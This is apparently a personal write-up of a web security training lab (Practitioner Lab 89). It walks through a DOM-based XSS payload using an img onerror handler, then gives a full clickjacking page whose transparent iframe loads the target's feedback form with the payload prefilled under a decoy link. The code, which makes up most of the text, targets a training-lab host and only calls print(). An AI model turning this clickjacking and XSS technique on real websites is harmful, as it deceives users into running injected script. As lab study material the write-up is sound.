# Practitioner Lab 89 : Exploiting clickjacking vulnerability to trigger DOM-based XSS

---

This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the `print()` function.

The first thing I see when the page opens is the submit feedback functionality which is new. 

I used the payload 

```
lb555<img src=0 onerror=print()><!--
```

this resulted in a print popping up

Now I will fill all the form parameters and have the user do click on it. 

```
<head>
	<style>
		#target_website {
			position:relative;
			width:1000px;
			height:1000px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:1000px;
			height:1000px;
                        top:820px;
                        left: 100px;
			z-index:1;
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	  <a href=""> click </a>
	</div>
	<iframe id="target_website" src="https://0a8b00af04a54f25830f51e300980086.web-security-academy.net/feedback?name=lb555%3Cimg+src%3D0+onerror%3Dprint%28%29%3E%3C%21--&email=yes%40yes&subject=yesy&message=yes">
	</iframe>
</body>
```

Using the following payload I was able to fill the whole form and then have the user submit it to run xss on their brower.
